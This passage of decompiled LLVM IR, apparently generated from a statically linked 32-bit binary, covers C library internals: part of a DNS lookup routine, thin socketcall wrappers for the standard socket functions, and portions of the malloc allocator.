  %v2_804ba28 = ptrtoint i32* %stack_var_-76 to i32
  %v2_804ba2d = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_804ba2d, i32* %eax.global-to-local, align 4
  store i32 %v2_804ba2d, i32* %stack_var_-108, align 4
  %v0_804ba37 = load i32, i32* @esi, align 4
  %v7_804ba3e = call i32 @__dns_lookup(i8* %v2_804b998, i32 1, i32 %v0_804ba37, i32 ptrtoint (i32* @global_var_8056dc8.340 to i32), i32 %v2_804ba2d, i32 %v2_804ba28)
  store i32 %v7_804ba3e, i32* %eax.global-to-local, align 4
  %v2_804ba46 = icmp slt i32 %v7_804ba3e, 0
  %v1_804ba48 = icmp eq i1 %v2_804ba46, false
  br i1 %v1_804ba48, label %dec_label_pc_804ba5e, label %dec_label_pc_804ba4a

dec_label_pc_804ba4a:                             ; preds = %dec_label_pc_804b9dc
  store i32 2, i32* %eax.global-to-local, align 4
  store i32 1, i32* %v1_804b8e9, align 4
  br label %dec_label_pc_804bbb2

dec_label_pc_804ba5e:                             ; preds = %dec_label_pc_804b9dc
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 256, i32* %eax.global-to-local, align 4
  %v10_804ba71 = icmp ugt i32 %v1_804b957, 256
  %v15_804ba71 = icmp eq i32 %v0_804b957, 300
  %v2_804ba75 = or i1 %v15_804ba71, %v10_804ba71
  br i1 %v2_804ba75, label %dec_label_pc_804bb10, label %dec_label_pc_804ba77

dec_label_pc_804ba77:                             ; preds = %dec_label_pc_804ba5e
  %v3_804ba7a = load i32, i32* %stack_var_-76, align 4
  store i32 %v3_804ba7a, i32* %stack_var_-108, align 4
  %v1_804ba7e = call i32 @free(i32 %v3_804ba7a)
  store i32 %v1_804ba7e, i32* %eax.global-to-local, align 4
  store i32 %v3_804ba7a, i32* @edi, align 4
  %v3_804ba84 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_804ba84, i32* %stack_var_-108, align 4
  %v1_804ba88 = call i32 @free(i32 %v3_804ba84)
  store i32 -1, i32* %v1_804b8e9, align 4
  store i32 34, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804bb88

dec_label_pc_804bb10:                             ; preds = %dec_label_pc_804ba5e
  %v3_804bb15.pre = load i32, i32* %stack_var_-76, align 4
  %v0_804bb19.pre = load i32, i32* @edi, align 4
  store i32 %v0_804bb19.pre, i32* %stack_var_-108, align 4
  %v3_804bb1a = inttoptr i32 %v0_804bb19.pre to i8*
  %v4_804bb1a = call i32 @strncpy(i8* %v3_804bb1a, i32 %v3_804bb15.pre, i32 %v1_804b957)
  store i32 %v4_804bb1a, i32* %eax.global-to-local, align 4
  %v3_804bb20 = load i32, i32* %stack_var_-76, align 4
  store i32 %v3_804bb20, i32* %stack_var_-108, align 4
  %v1_804bb24 = call i32 @free(i32 %v3_804bb20)
  store i32 %v1_804bb24, i32* %eax.global-to-local, align 4
  %v12_804bb2c = icmp eq i32 %tmp10, 1
  %v1_804bb31 = icmp eq i1 %v12_804bb2c, false
  br i1 %v1_804bb31, label %dec_label_pc_804bb8d, label %dec_label_pc_804bb33

dec_label_pc_804bb33:                             ; preds = %dec_label_pc_804bb10
  %v0_804bb33 = load i32, i32* @edx, align 4
  %v0_804bb3a = load i32, i32* @ebp, align 4
  store i32 %v0_804bb3a, i32* %stack_var_-108, align 4
  %v3_804bb3b = inttoptr i32 %tmp to i16*
  %v4_804bb3b = call i32 @memcpy(i16* %v3_804bb3b, i32 4, i32 %v0_804bb33)
  store i32 %tmp18, i32* %eax.global-to-local, align 4
  %v0_804bb44 = load i32, i32* @edi, align 4
  store i32 %v0_804bb44, i32* %arg2, align 4
  %v1_804bb46 = add i32 %tmp18, 8
  %v2_804bb46 = inttoptr i32 %v1_804bb46 to i32*
  store i32 2, i32* %v2_804bb46, align 4
  %v0_804bb4d = load i32, i32* %eax.global-to-local, align 4
  %v1_804bb4d = add i32 %v0_804bb4d, 12
  %v2_804bb4d = inttoptr i32 %v1_804bb4d to i32*
  store i32 4, i32* %v2_804bb4d, align 4
  %v3_804bb54 = load i32, i32* %stack_var_-92, align 4
  store i32 %v3_804bb54, i32* %edx.global-to-local, align 4
  %v1_804bb58 = load i32, i32* %eax.global-to-local, align 4
  %v2_804bb58 = add i32 %v1_804bb58, 16
  %v3_804bb58 = inttoptr i32 %v2_804bb58 to i32*
  store i32 %v3_804bb54, i32* %v3_804bb58, align 4
  %v1_804bb5f = load i32, i32* %eax.global-to-local, align 4
  %v2_804bb5f = add i32 %v1_804bb5f, 4
  %v3_804bb5f = inttoptr i32 %v2_804bb5f to i32*
  store i32 %v1_804b96a, i32* %v3_804bb5f, align 4
  %v2_804bb62 = load i32, i32* %stack_var_-108, align 4
  store i32 %v2_804bb62, i32* %eax.global-to-local, align 4
  %v3_804bb63 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_804bb63, i32* %stack_var_-108, align 4
  %v1_804bb67 = call i32 @free(i32 %v3_804bb63)
  store i32 %tmp18, i32* %edx.global-to-local, align 4
  store i32 %tmp18, i32* %v1_804b89b, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 0, i32* %v1_804b8e9, align 4
  br label %dec_label_pc_804bb88

dec_label_pc_804bb88:                             ; preds = %dec_label_pc_804bb8d, %dec_label_pc_804ba77, %dec_label_pc_804bb33
  br label %dec_label_pc_804bbb2

dec_label_pc_804bb8d:                             ; preds = %dec_label_pc_804bb10
  %v3_804bb90 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_804bb90, i32* %stack_var_-108, align 4
  %v1_804bb94 = call i32 @free(i32 %v3_804bb90)
  store i32 1, i32* %v1_804b8e9, align 4
  store i32 2, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804bb88

dec_label_pc_804bbad:                             ; preds = %dec_label_pc_804b957, %dec_label_pc_804b93b, %dec_label_pc_804b92f, %dec_label_pc_804b91c, %dec_label_pc_804b910
  store i32 34, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804bbb2

dec_label_pc_804bbb2:                             ; preds = %dec_label_pc_804b8fc, %dec_label_pc_804b8f5, %dec_label_pc_804b8b1, %entry, %dec_label_pc_804bb88, %dec_label_pc_804ba4a, %dec_label_pc_804b9a4, %dec_label_pc_804bbad
  store i32 %v0_804b88b, i32* @ebx, align 4
  store i32 %v0_804b88a, i32* @esi, align 4
  store i32 %v0_804b889, i32* @edi, align 4
  store i32 %v0_804b888, i32* @ebp, align 4
  %v0_804bbb9 = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_804bbb9

; uselistorder directives
  uselistorder i32 %v2_804b9ec, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v1_804b96d, { 1, 0, 2 }
  uselistorder i32 %v1_804b96a, { 1, 0 }
  uselistorder i32 %v1_804b957, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v0_804b920.pre, { 0, 2, 1 }
  uselistorder i32 %v1_804b90b, { 4, 2, 3, 1, 0 }
  uselistorder i32 %v2_804b8e9, { 2, 0, 1, 3 }
  uselistorder i32* %v1_804b8e9, { 5, 4, 3, 2, 1, 0, 6 }
  uselistorder i32* %v1_804b89b, { 1, 0, 2 }
  uselistorder i32* %stack_var_-76, { 1, 0, 2, 3 }
  uselistorder i32 %tmp18, { 6, 5, 0, 4, 1, 3, 2 }
  uselistorder i32* %eax.global-to-local, { 28, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 29 }
  uselistorder i32 %arg6, { 2, 1, 0 }
  uselistorder i32 %arg1, { 5, 4, 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_804bbb2, { 7, 4, 5, 6, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_804bb88, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804b91c, { 1, 0 }
}

define i32 @__libc_accept(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_804bbd7 = ptrtoint i32* %stack_var_-12 to i32
  %v2_804bbde = call i32 @__socketcall(i32 5, i32 %v2_804bbd7)
  ret i32 %v2_804bbde

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @bind(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_804bc03 = ptrtoint i32* %stack_var_-12 to i32
  %v2_804bc0a = call i32 @__socketcall(i32 2, i32 %v2_804bc03)
  ret i32 %v2_804bc0a

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @__libc_connect(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_804bc2f = ptrtoint i32* %stack_var_-12 to i32
  %v2_804bc36 = call i32 @__socketcall(i32 3, i32 %v2_804bc2f)
  ret i32 %v2_804bc36

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @listen(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-8, align 4
  %v2_804bc53 = ptrtoint i32* %stack_var_-8 to i32
  %v2_804bc5a = call i32 @__socketcall(i32 4, i32 %v2_804bc53)
  ret i32 %v2_804bc5a

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @__libc_recv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-16, align 4
  %v2_804bc87 = ptrtoint i32* %stack_var_-16 to i32
  %v2_804bc8e = call i32 @__socketcall(i32 10, i32 %v2_804bc87)
  ret i32 %v2_804bc8e

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
}

define i32 @__libc_send(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-16, align 4
  %v2_804bcbb = ptrtoint i32* %stack_var_-16 to i32
  %v2_804bcc2 = call i32 @__socketcall(i32 9, i32 %v2_804bcbb)
  ret i32 %v2_804bcc2

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
}

define i32 @__libc_sendto(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_804bcff = ptrtoint i32* %stack_var_-24 to i32
  %v2_804bd06 = call i32 @__socketcall(i32 11, i32 %v2_804bcff)
  ret i32 %v2_804bd06

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @__GI_setsockopt() local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %v2_804bd3b = ptrtoint i32* %stack_var_-20 to i32
  %v2_804bd42 = call i32 @__socketcall(i32 14, i32 %v2_804bd3b)
  ret i32 %v2_804bd42
}

define i32 @socket(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_804bd67 = ptrtoint i32* %stack_var_-12 to i32
  %v2_804bd6e = call i32 @__socketcall(i32 1, i32 %v2_804bd67)
  ret i32 %v2_804bd6e

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
  uselistorder i32 (i32, i32)* @__socketcall, { 0, 8, 7, 2, 3, 6, 1, 5, 4 }
}

define i32 @__malloc_largebin_index() local_unnamed_addr {
entry:
  %v0_804bd78 = load i32, i32* @eax, align 4
  %v6_804bd8b = icmp ugt i32 %v0_804bd78, 16777215
  br i1 %v6_804bd8b, label %dec_label_pc_804bd9c, label %dec_label_pc_804bd8d

dec_label_pc_804bd8d:                             ; preds = %entry
  %tmp = icmp ult i32 %v0_804bd78, 256
  %v2_804bd7b = udiv i32 %v0_804bd78, 256
  %v2_804bd8d = call i32 @llvm.ctlz.i32(i32 %v2_804bd7b, i1 true)
  %v3_804bd8d = xor i32 %v2_804bd8d, 31
  %v5_804bd8d = select i1 %tmp, i32 95, i32 %v3_804bd8d
  %v1_804bd90 = add nuw nsw i32 %v5_804bd8d, 6
  store i32 %v1_804bd90, i32* @ecx, align 4
  %v2_804bd93 = urem i32 %v1_804bd90, 32
  %v4_804bd93 = icmp eq i32 %v2_804bd93, 0
  br i1 %v4_804bd93, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_804bd8d
  %v5_804bd93 = lshr i32 %v0_804bd78, %v2_804bd93
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_804bd8d, %bb
  %v0_804bd95 = phi i32 [ %v0_804bd78, %dec_label_pc_804bd8d ], [ %v5_804bd93, %bb ]
  %v1_804bd95 = urem i32 %v0_804bd95, 4
  %v2_804bd98 = mul nuw nsw i32 %v5_804bd8d, 4
  %v3_804bd98 = or i32 %v1_804bd95, 32
  %v4_804bd98 = add nuw nsw i32 %v3_804bd98, %v2_804bd98
  br label %dec_label_pc_804bd9c

dec_label_pc_804bd9c:                             ; preds = %entry, %bb4
  %v0_804bd9d = phi i32 [ 95, %entry ], [ %v4_804bd98, %bb4 ]
  ret i32 %v0_804bd9d

; uselistorder directives
  uselistorder i32 %v2_804bd93, { 1, 0 }
  uselistorder i32 %v0_804bd78, { 2, 3, 1, 0, 4 }
  uselistorder label %dec_label_pc_804bd9c, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @malloc(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804bd9e = load i32, i32* @ebp, align 4
  %v0_804bd9f = load i32, i32* @edi, align 4
  %v0_804bda0 = load i32, i32* @esi, align 4
  %v0_804bda1 = load i32, i32* @ebx, align 4
  store i32 %v0_804bda1, i32* %stack_var_-16, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_804bdb3 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804bdb3, i32* @eax, align 4
  store i32 %v2_804bdb3, i32* %stack_var_-92, align 4
  %v2_804bdb8 = call i32 @__pthread_return_void(i32 %v2_804bdb3, i32 134534955)
  store i32 %v2_804bdb8, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8054210.341 to i32), i32* %stack_var_-92, align 4
  %v1_804bdc4 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8054210.341 to i32))
  store i32 %v1_804bdc4, i32* %eax.global-to-local, align 4
  %v0_804bdcc = load i32, i32* %ebx.global-to-local, align 4
  %tmp125 = icmp ult i32 %v0_804bdcc, -32
  br i1 %tmp125, label %dec_label_pc_804bde3, label %dec_label_pc_804bdd1

dec_label_pc_804bdd1:                             ; preds = %entry
  %v0_804bdd1 = load i32, i32* %stack_var_-92, align 4
  %v1_804bdd1 = call i32 @__errno_location(i32 %v0_804bdd1)
  store i32 %v1_804bdd1, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_804bdd8 = inttoptr i32 %v1_804bdd1 to i32*
  store i32 12, i32* %v1_804bdd8, align 4
  br label %dec_label_pc_804c508

dec_label_pc_804bde3:                             ; preds = %entry
  %v1_804bde3 = add i32 %v0_804bdcc, 11
  %tmp126 = icmp ult i32 %v1_804bde3, 16
  br i1 %tmp126, label %dec_label_pc_804bdfa, label %dec_label_pc_804bdf3

dec_label_pc_804bdf3:                             ; preds = %dec_label_pc_804bde3
  %v1_804bdf3 = and i32 %v1_804bde3, -8
  br label %dec_label_pc_804bdfa

dec_label_pc_804bdfa:                             ; preds = %dec_label_pc_804bde3, %dec_label_pc_804bdf3
  %storemerge136 = phi i32 [ %v1_804bdf3, %dec_label_pc_804bdf3 ], [ %v1_804bde3, %dec_label_pc_804bde3 ]
  %v1_804c192 = phi i32 [ %v1_804bdf3, %dec_label_pc_804bdf3 ], [ 16, %dec_label_pc_804bde3 ]
  store i32 %storemerge136, i32* %eax.global-to-local, align 4
  %v0_804bdfa = load i8, i8* @global_var_8056a40.342, align 1
  %v1_804bdfa = sext i8 %v0_804bdfa to i32
  store i32 %v1_804bdfa, i32* @ebx, align 4
  %v3_804be00 = urem i8 %v0_804bdfa, 2
  %v4_804be00 = icmp eq i8 %v3_804be00, 0
  %v1_804be03 = icmp eq i1 %v4_804be00, false
  br i1 %v1_804be03, label %dec_label_pc_804be22, label %dec_label_pc_804be05

dec_label_pc_804be05:                             ; preds = %dec_label_pc_804bdfa
  %v2_804be05 = icmp eq i8 %v0_804bdfa, 0
  %v1_804be07 = icmp eq i1 %v2_804be05, false
  br i1 %v1_804be07, label %dec_label_pc_804c0fd, label %dec_label_pc_804be0d

dec_label_pc_804be0d:                             ; preds = %dec_label_pc_804be05
  store i32 ptrtoint (i8* @global_var_8056a40.342 to i32), i32* %stack_var_-92, align 4
  %v2_804be15 = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_8056a40.342 to i32*))
  store i32 %v2_804be15, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804c0fd

dec_label_pc_804be22:                             ; preds = %dec_label_pc_804bdfa
  %v11_804be22 = trunc i32 %v1_804c192 to i8
  %v8_804be26 = icmp ugt i8 %v11_804be22, %v0_804bdfa
  br i1 %v8_804be26, label %dec_label_pc_804be43, label %dec_label_pc_804be28

dec_label_pc_804be28:                             ; preds = %dec_label_pc_804be22
  %v2_804be2c = udiv i32 %v1_804c192, 2
  store i32 %v2_804be2c, i32* %eax.global-to-local, align 4
  %v1_804be2e = add i32 %v2_804be2c, ptrtoint (i8* @global_var_8056a40.342 to i32)
  store i32 %v1_804be2e, i32* @ecx, align 4
  %v1_804be34 = add i32 %v2_804be2c, add (i32 ptrtoint (i8* @global_var_8056a40.342 to i32), i32 -4)
  %v2_804be34 = inttoptr i32 %v1_804be34 to i32*
  %v3_804be34 = load i32, i32* %v2_804be34, align 4
  store i32 %v3_804be34, i32* @edx, align 4
  %v1_804be37 = icmp eq i32 %v3_804be34, 0
  br i1 %v1_804be37, label %dec_label_pc_804be43, label %dec_label_pc_804be3b

dec_label_pc_804be3b:                             ; preds = %dec_label_pc_804be28
  %v1_804be3b = add i32 %v3_804be34, 8
  %v2_804be3b = inttoptr i32 %v1_804be3b to i32*
  %v3_804be3b = load i32, i32* %v2_804be3b, align 4
  store i32 %v3_804be3b, i32* %eax.global-to-local, align 4
  store i32 %v3_804be3b, i32* %v2_804be34, align 4
  br label %dec_label_pc_804be7c

dec_label_pc_804be43:                             ; preds = %dec_label_pc_804be28, %dec_label_pc_804be22
  %v8_804be43 = icmp ult i32 %v1_804c192, 255
  %v6_804be4b = icmp ugt i32 %v1_804c192, 255
  store i32 %v1_804c192, i32* @eax, align 4
  br i1 %v6_804be4b, label %dec_label_pc_804be84, label %dec_label_pc_804be4d

dec_label_pc_804be4d:                             ; preds = %dec_label_pc_804be43
  %v2_804be51 = udiv i32 %v1_804c192, 8
  store i32 %v2_804be51, i32* %eax.global-to-local, align 4
  %v1_804be58 = mul nuw i32 %v2_804be51, 8
  %v2_804be58 = add i32 %v1_804be58, ptrtoint (i32* @global_var_8056a6c.343 to i32)
  store i32 %v2_804be58, i32* @ecx, align 4
  %v1_804be5f = add i32 %v1_804be58, add (i32 ptrtoint (i32* @global_var_8056a6c.343 to i32), i32 12)
  %v2_804be5f = inttoptr i32 %v1_804be5f to i32*
  %v3_804be5f = load i32, i32* %v2_804be5f, align 4
  store i32 %v3_804be5f, i32* @edx, align 4
  %v12_804be62 = icmp eq i32 %v3_804be5f, %v2_804be58
  br i1 %v12_804be62, label %dec_label_pc_804bf80.preheader, label %dec_label_pc_804be6a

dec_label_pc_804be6a:                             ; preds = %dec_label_pc_804be4d
  store i32 %v1_804c192, i32* %ebx.global-to-local, align 4
  %v1_804be6e = add i32 %v3_804be5f, 12
  %v2_804be6e = inttoptr i32 %v1_804be6e to i32*
  %v3_804be6e = load i32, i32* %v2_804be6e, align 4
  store i32 %v3_804be6e, i32* %eax.global-to-local, align 4
  store i32 %v3_804be6e, i32* %v2_804be5f, align 4
  %v0_804be74 = load i32, i32* @edx, align 4
  %v1_804be74 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804be74 = add i32 %v0_804be74, 4
  %v3_804be74 = add i32 %v2_804be74, %v1_804be74
  %v4_804be74 = inttoptr i32 %v3_804be74 to i32*
  %v5_804be74 = load i32, i32* %v4_804be74, align 4
  %v6_804be74 = or i32 %v5_804be74, 1
  store i32 %v6_804be74, i32* %v4_804be74, align 4
  %v0_804be79 = load i32, i32* @ecx, align 4
  %v1_804be79 = load i32, i32* %eax.global-to-local, align 4
  %v2_804be79 = add i32 %v1_804be79, 8
  %v3_804be79 = inttoptr i32 %v2_804be79 to i32*
  store i32 %v0_804be79, i32* %v3_804be79, align 4
  br label %dec_label_pc_804be7c

dec_label_pc_804be7c:                             ; preds = %dec_label_pc_804c219, %dec_label_pc_804c22b, %dec_label_pc_804be3b, %dec_label_pc_804be6a
  %v0_804be7c = load i32, i32* @edx, align 4
  %v1_804be7c = add i32 %v0_804be7c, 8
  store i32 %v1_804be7c, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804c4f7

dec_label_pc_804be84:                             ; preds = %dec_label_pc_804be43
  %v0_804be88 = call i32 @__malloc_largebin_index()
  store i32 %v0_804be88, i32* %eax.global-to-local, align 4
  %v3_804be8d = and i8 %v0_804bdfa, 2
  %v4_804be8d = icmp eq i8 %v3_804be8d, 0
  %v6_804be8d = zext i8 %v3_804be8d to i32
  %v9_804be8d = and i32 %v1_804bdfa, -256
  %v10_804be8d = or i32 %v9_804be8d, %v6_804be8d
  store i32 %v10_804be8d, i32* @ebx, align 4
  br i1 %v4_804be8d, label %dec_label_pc_804bf80.preheader, label %dec_label_pc_804be9a

dec_label_pc_804be9a:                             ; preds = %dec_label_pc_804be84
  store i32 ptrtoint (i8* @global_var_8056a40.342 to i32), i32* %stack_var_-92, align 4
  %v2_804bea2 = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_8056a40.342 to i32*))
  store i32 %v2_804bea2, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804bf80.preheader

dec_label_pc_804bf80.preheader:                   ; preds = %dec_label_pc_804be9a, %dec_label_pc_804be4d, %dec_label_pc_804be84
  %stack_var_-40.0.ph = phi i32 [ %v2_804be51, %dec_label_pc_804be4d ], [ %v0_804be88, %dec_label_pc_804be9a ], [ %v0_804be88, %dec_label_pc_804be84 ]
  %v1_804bed6 = add i32 %v1_804c192, 16
  %v0_804bf80107 = load i32, i32* @global_var_8056a80.346, align 128
  store i32 %v0_804bf80107, i32* @ebp, align 4
  %v9_804bf86109 = icmp eq i32 %v0_804bf80107, 134572660
  %v1_804bf8c110 = icmp eq i1 %v9_804bf86109, false
  br i1 %v1_804bf8c110, label %dec_label_pc_804beaf, label %dec_label_pc_804bf92

dec_label_pc_804beaf:                             ; preds = %dec_label_pc_804bf80.preheader, %bb84
  %v0_804bf80111 = phi i32 [ %v0_804bf80, %bb84 ], [ %v0_804bf80107, %dec_label_pc_804bf80.preheader ]
  %v1_804beaf = add i32 %v0_804bf80111, 4
  %v2_804beaf = inttoptr i32 %v1_804beaf to i32*
  %v3_804beaf = load i32, i32* %v2_804beaf, align 4
  %v1_804beb2 = add i32 %v0_804bf80111, 12
  %v2_804beb2 = inttoptr i32 %v1_804beb2 to i32*
  %v3_804beb2 = load i32, i32* %v2_804beb2, align 4
  store i32 %v3_804beb2, i32* @edx, align 4
  %v1_804beb5 = and i32 %v3_804beaf, -4
  store i32 %v1_804beb5, i32* @edi, align 4
  br i1 %v6_804be4b, label %dec_label_pc_804bee1, label %dec_label_pc_804bec2

dec_label_pc_804bec2:                             ; preds = %dec_label_pc_804beaf
  %v9_804bec2 = icmp eq i32 %v3_804beb2, 134572660
  %v1_804bec8 = icmp eq i1 %v9_804bec2, false
  br i1 %v1_804bec8, label %dec_label_pc_804bee1, label %dec_label_pc_804beca

dec_label_pc_804beca:                             ; preds = %dec_label_pc_804bec2
  %v1_804beca = load i32, i32* @global_var_8056a70.344, align 16
  %v12_804beca = icmp eq i32 %v0_804bf80111, %v1_804beca
  %v1_804bed0 = icmp eq i1 %v12_804beca, false
  br i1 %v1_804bed0, label %dec_label_pc_804bee1, label %dec_label_pc_804bed2

dec_label_pc_804bed2:                             ; preds = %dec_label_pc_804beca
  store i32 %v1_804bed6, i32* %eax.global-to-local, align 4
  %v6_804bedb = icmp ugt i32 %v1_804beb5, %v1_804bed6
  br i1 %v6_804bedb, label %dec_label_pc_804c492, label %dec_label_pc_804bee1

dec_label_pc_804bee1:                             ; preds = %dec_label_pc_804bed2, %dec_label_pc_804beca, %dec_label_pc_804bec2, %dec_label_pc_804beaf
  store i32 ptrtoint (i32* @global_var_8056a74.345 to i32), i32* %eax.global-to-local, align 4
  %v2_804bee6 = add i32 %v3_804beb2, 8
  %v3_804bee6 = inttoptr i32 %v2_804bee6 to i32*
  store i32 ptrtoint (i32* @global_var_8056a74.345 to i32), i32* %v3_804bee6, align 4
  %v0_804bee9 = load i32, i32* @edx, align 4
  store i32 %v0_804bee9, i32* @global_var_8056a80.346, align 4
  %v0_804beec = load i32, i32* @edi, align 4
  %v15_804beec = icmp eq i32 %v0_804beec, %v1_804c192
  br i1 %v15_804beec, label %dec_label_pc_804c4d3, label %dec_label_pc_804bef6

dec_label_pc_804bef6:                             ; preds = %dec_label_pc_804bee1
  %v6_804befc = icmp ugt i32 %v0_804beec, 255
  br i1 %v6_804befc, label %dec_label_pc_804bf0f, label %dec_label_pc_804befe

dec_label_pc_804befe:                             ; preds = %dec_label_pc_804bef6
  %v2_804bf00 = udiv i32 %v0_804beec, 8
  store i32 %v2_804bf00, i32* %esi.global-to-local, align 4
  %v1_804bf03 = mul nuw i32 %v2_804bf00, 8
  %v2_804bf03 = add i32 %v1_804bf03, 134572652
  store i32 %v2_804bf03, i32* @ebx, align 4
  %v1_804bf0a = add i32 %v1_804bf03, 134572660
  %v2_804bf0a = inttoptr i32 %v1_804bf0a to i32*
  %v3_804bf0a = load i32, i32* %v2_804bf0a, align 4
  store i32 %v3_804bf0a, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804bf58

dec_label_pc_804bf0f:                             ; preds = %dec_label_pc_804bef6
  store i32 %v0_804beec, i32* @eax, align 4
  %v0_804bf11 = call i32 @__malloc_largebin_index()
  store i32 %v0_804bf11, i32* %esi.global-to-local, align 4
  %v1_804bf18 = mul i32 %v0_804bf11, 8
  %v2_804bf18 = add i32 %v1_804bf18, ptrtoint (i32* @global_var_8056a6c.343 to i32)
  store i32 %v2_804bf18, i32* %eax.global-to-local, align 4
  %v1_804bf1f = add i32 %v1_804bf18, add (i32 ptrtoint (i32* @global_var_8056a6c.343 to i32), i32 8)
  %v2_804bf1f = inttoptr i32 %v1_804bf1f to i32*
  %v3_804bf1f = load i32, i32* %v2_804bf1f, align 4
  store i32 %v3_804bf1f, i32* %edx.global-to-local, align 4
  store i32 %v3_804bf1f, i32* @ebx, align 4
  %v12_804bf28 = icmp eq i32 %v3_804bf1f, %v2_804bf18
  br i1 %v12_804bf28, label %dec_label_pc_804bf58, label %dec_label_pc_804bf2c

dec_label_pc_804bf2c:                             ; preds = %dec_label_pc_804bf0f
  %v1_804bf2c = add i32 %v1_804bf18, add (i32 ptrtoint (i32* @global_var_8056a6c.343 to i32), i32 12)
  %v2_804bf2c = inttoptr i32 %v1_804bf2c to i32*
  %v3_804bf2c = load i32, i32* %v2_804bf2c, align 4
  store i32 %v3_804bf2c, i32* @ebx, align 4
  %v0_804bf2f = load i32, i32* @edi, align 4
  %v2_804bf2f = add i32 %v3_804bf2c, 4
  %v3_804bf2f = inttoptr i32 %v2_804bf2f to i32*
  %v4_804bf2f = load i32, i32* %v3_804bf2f, align 4
  %v10_804bf2f = icmp ult i32 %v0_804bf2f, %v4_804bf2f
  %v1_804bf32 = icmp eq i1 %v10_804bf2f, false
  br i1 %v1_804bf32, label %dec_label_pc_804bf3a, label %dec_label_pc_804bf58

dec_label_pc_804bf3a:                             ; preds = %dec_label_pc_804bf2c
  %v1_804bf3c = or i32 %v0_804bf2f, 1
  store i32 %v1_804bf3c, i32* %eax.global-to-local, align 4
  store i32 %v3_804bf1f, i32* %ebx.global-to-local, align 4
  %v2_804bf50101 = add i32 %v3_804bf1f, 4
  %v3_804bf50102 = inttoptr i32 %v2_804bf50101 to i32*
  %v4_804bf50103 = load i32, i32* %v3_804bf50102, align 4
  %v10_804bf50104 = icmp ult i32 %v1_804bf3c, %v4_804bf50103
  br i1 %v10_804bf50104, label %dec_label_pc_804bf41, label %dec_label_pc_804bf55

dec_label_pc_804bf41:                             ; preds = %dec_label_pc_804bf3a, %dec_label_pc_804bf41
  %v0_804bf55105 = phi i32 [ %v3_804bf45, %dec_label_pc_804bf41 ], [ %v3_804bf1f, %dec_label_pc_804bf3a ]
  store i32 %v0_804bf55105, i32* %ecx.global-to-local, align 4
  %v1_804bf45 = add i32 %v0_804bf55105, 8
